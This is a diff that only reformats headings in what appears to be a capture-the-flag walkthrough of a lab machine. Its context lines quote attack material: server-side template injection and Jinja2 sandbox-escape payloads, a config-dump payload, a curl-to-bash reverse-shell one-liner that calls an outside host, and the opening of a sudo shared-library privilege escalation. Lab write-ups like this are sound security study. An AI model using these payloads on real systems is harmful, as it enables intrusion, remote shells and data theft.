@@ -140,7 +140,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
 
 [Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
 
-[#Anonymous login]
+[**#Anonymous login**]
 
 - _anonymous_ : _anonymous_
 - _anonymous_ :
@@ -225,12 +225,12 @@ http://192.168.56.147:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Wer
 
 [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
 
-[#Python]
+[**#Python**]
 
 Check out the following page to learn tricks about **arbitrary command execution bypassing sandboxes** in python:
 [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
 
-[#Tornado (Python)]
+[**#Tornado (Python)**]
 
 ```python
 {{7*7}} = 49
@@ -244,7 +244,7 @@ ${7*7} = ${7*7}
 {{os.system('whoami')}}
 ```
 
-[#Jinja2 (Python)]
+[**#Jinja2 (Python)**]
 
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
 > 
@@ -377,7 +377,7 @@ Content-Type: text/html
 
 First of all, in a **Jinja injection** you need to **find a way to escape from the sandbox** and recover access the regular python execution flow. To do so, you need to **abuse objects** that are **from** the **non-sandboxed environment but are accessible from the sandbox**.
 
-[#Accessing Global Objects]
+[**#Accessing Global Objects**]
 
 For example, in the code `render_template("hello.html", username=username, email=email)` the objects username and email **come from the non-sanboxed python env** and will be **accessible** inside the **sandboxed env.** Moreover, there are other objects that will be **always accessible from the sandboxed env**, these are:
 ```
@@ -389,7 +389,7 @@ config
 request
 ```
 
-[#Recovering <class 'object'>]
+[**#Recovering <class 'object'>**]
 
 Then, from these objects we need to get to the class: `**<class 'object'>**` in order to try to **recover** defined **classes**. This is because from this object we can call the `**__subclasses__**` method and **access all the classes from the non-sandboxed** python env.
 
@@ -435,7 +435,7 @@ dict.__mro__[-1]
 {{ ''.class.mro()[1].subclasses() }}
 ```
 
-[#Dump all config variables]
+[**#Dump all config variables**]
 
 ```
 {{ config }} #In these object you can find all the configured env variables
@@ -563,7 +563,7 @@ Content-Type: text/html
 
 [Payloads All The Things - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
 
-[#Jinja2 - Dump all used classes]
+[**#Jinja2 - Dump all used classes**]
 
 ```python
 {{ [].class.base.subclasses() }}
@@ -576,7 +576,7 @@ Access `__globals__` and `__builtins__`:
 {{ self.__init__.__globals__.__builtins__ }}
 ```
 
-[#Jinja2 - Read remote file]
+[**#Jinja2 - Read remote file**]
 
 ```python
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
@@ -757,7 +757,7 @@ TEST ←
 
 [Reverse Shells - Linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
 
-[#Bash | sh]
+[**#Bash | sh**]
 
 ```bash
 curl https://reverse-shell.sh/1.1.1.1:3000 | bash
@@ -773,7 +773,7 @@ exec >&0
 ```
 Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.
 
-[#Symbol safe shell]
+[**#Symbol safe shell**]
 
 ```bash
 #If you need a more stable connection do:
@@ -1109,7 +1109,7 @@ bool main(void)
 
 [Sudo Privilege Escalation by Overriding Shared Library](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/)
 
-[#Investigation]
+[**#Investigation**]
 
 Check sudo commands.
 ```sh
@@ -1132,7 +1132,7 @@ By the way, to list shared libraries required by the executable, use `ldd` comma
 ldd somecmd
 ```
 
-[#Exploitation]
+[**#Exploitation**]
 
 First off, create **exploit.c** under **/tmp** .
 ```c
